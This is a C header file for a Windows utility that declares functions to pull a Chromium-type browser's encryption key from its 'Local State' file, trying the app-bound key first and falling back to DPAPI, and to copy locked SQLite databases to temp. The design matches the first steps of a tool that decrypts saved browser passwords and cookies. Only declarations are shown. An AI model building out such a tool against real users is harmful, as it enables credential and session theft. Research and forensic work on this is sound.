#ifndef STRUTIL_H
#define STRUTIL_H

#include <windows.h>

// Build full path: %LOCALAPPDATA%\<relative>
// Returns allocated string, caller frees.
char* build_local_path(const wchar_t* relative);

// Read entire file into buffer. *out_size receives byte count.
// Returns allocated buffer, caller frees.
PBYTE read_file_bin(const char* path, DWORD* out_size);

// Key type returned by extract_browser_key
typedef enum _KEY_TYPE {
    KEY_NONE = 0,
    KEY_ABE,        // app_bound_encrypted_key (needs COM elevator)
    KEY_DPAPI,      // os_crypt.encrypted_key (needs CryptUnprotectData)
} KEY_TYPE;

// Extract the encryption key from Local State.
// Tries app_bound_encrypted_key first, falls back to os_crypt.encrypted_key.
// Returns allocated decoded bytes, *out_len receives byte count,
// *out_type indicates which key was found.
// For ABE keys: strips the 4-byte version prefix.
// For DPAPI keys: strips the 5-byte "DPAPI" prefix.
PBYTE extract_browser_key(const char* local_state_path, DWORD* out_len, KEY_TYPE* out_type);

// Legacy wrapper — ABE only
PBYTE extract_abe_key(const char* local_state_path, DWORD* out_len);

// Copy file to a temp path (for SQLite, since browser may hold locks).
// Returns allocated path string, caller frees.
char* copy_to_temp(const char* src_path);

#endif
